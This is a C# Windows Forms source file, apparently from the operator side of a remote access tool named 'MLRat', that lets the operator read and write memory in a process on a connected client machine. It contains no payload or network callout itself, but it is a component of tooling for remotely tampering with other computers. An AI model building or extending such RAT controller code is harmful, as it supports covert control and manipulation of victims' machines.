using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MLManagementServer.Forms
{
    public partial class formMemoryEdit : Form
    {
        IClient Client;
        int ProcessID = 0;
        public formMemoryEdit(IClient c, int pid)
        {
            InitializeComponent();
            Client = c;
            ProcessID = pid;
        }
        public void SetMemoryValue(int value)
        {
            Invoke((MethodInvoker)delegate ()
            {
                nudValue.Value = value;
            });
        }
        private void formMemoryEdit_Load(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.GetModules, ProcessID);
        }
        public void SetModules(string[] modules)
        {
            Invoke((MethodInvoker)delegate ()
            {
                cbModules.Items.Clear();
                foreach (string s in modules)
                    cbModules.Items.Add(s);
                if (modules.Length > 0)
                    cbModules.SelectedIndex = 0;
            });
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.WriteMemory, ProcessID, cbModules.Text, (int)nudOffset.Value, (int)nudValue.Value);
            DialogResult = DialogResult.OK;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Client.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.ReadMemory, ProcessID, cbModules.Text, (int)nudOffset.Value);
        }
    }

    class HexUpDown : NumericUpDown
    {
        public HexUpDown()
        {
            this.Hexadecimal = true;
        }

        protected override void ValidateEditText()
        {
            try
            {
                var txt = this.Text;
                if (!string.IsNullOrEmpty(txt))
                {
                    if (txt.StartsWith("0x")) txt = txt.Substring(2);
                    var value = Convert.ToDecimal(Convert.ToInt32(txt, 16));
                    value = Math.Max(value, this.Minimum);
                    value = Math.Min(value, this.Maximum);
                    this.Value = value;
                }
            }
            catch { }
            base.UserEdit = false;
            UpdateEditText();
        }

        protected override void UpdateEditText()
        {
            int value = Convert.ToInt32(this.Value);
            this.Text = "0x" + value.ToString("X4");
        }
    }
}
